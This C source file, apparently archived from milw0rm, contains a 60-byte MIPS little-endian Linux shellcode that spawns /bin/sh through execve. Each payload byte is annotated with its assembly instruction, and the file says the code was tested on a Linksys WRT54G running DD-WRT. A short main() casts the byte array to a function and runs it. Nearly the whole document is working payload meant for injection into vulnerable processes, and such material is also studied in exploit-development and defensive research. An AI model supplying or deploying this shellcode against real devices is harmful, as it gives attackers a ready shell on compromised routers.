/*	- MIPS little-endian
 *	- linux execve 60 bytes shellcode
 *	- execve("/bin/sh",["/bin/sh"],[]);
 *      - tested on Linksys WRT54G/GL (DD-WRT Linux)
 *      - based on scut paper Writing MIPS/Irix shellcode
 *
 *                              vaicebine at gmail dot com
 */
#include <stdio.h>


char shellcode[] = {
	"\x50\x73\x06\x24" /*     li      a2,0x7350             */
	"\xff\xff\xd0\x04" /* LB: bltzal  a2,LB                 */
	"\x50\x73\x0f\x24" /*     li      $t7,0x7350 (nop)      */
	"\xff\xff\x06\x28" /*     slti    a2, $0,-1             */
	"\xe0\xff\xbd\x27" /*     addiu   sp,sp,-32             */
	"\xd7\xff\x0f\x24" /*     li      t7,-41                */
	"\x27\x78\xe0\x01" /*     nor     t7,t7,zero            */
	"\x21\x20\xef\x03" /*     addu    a0,ra,t7              */
	"\xe8\xff\xa4\xaf" /*     sw      a0,-24(sp)            */
	"\xec\xff\xa0\xaf" /*     sw      zero,-20(sp)          */
	"\xe8\xff\xa5\x23" /*     addi    a1,sp,-24             */
	"\xab\x0f\x02\x24" /*     li      v0,4011               */
	"\x0c\x01\x01\x01" /*     syscall                       */
	"/bin/sh"
};

int main(int argc, char *argv[])
{
	void (*p)(void);
	p = shellcode;
	printf("shellcode size %d\n", sizeof(shellcode));
	p();

	return 0;
}

// milw0rm.com [2008-08-18]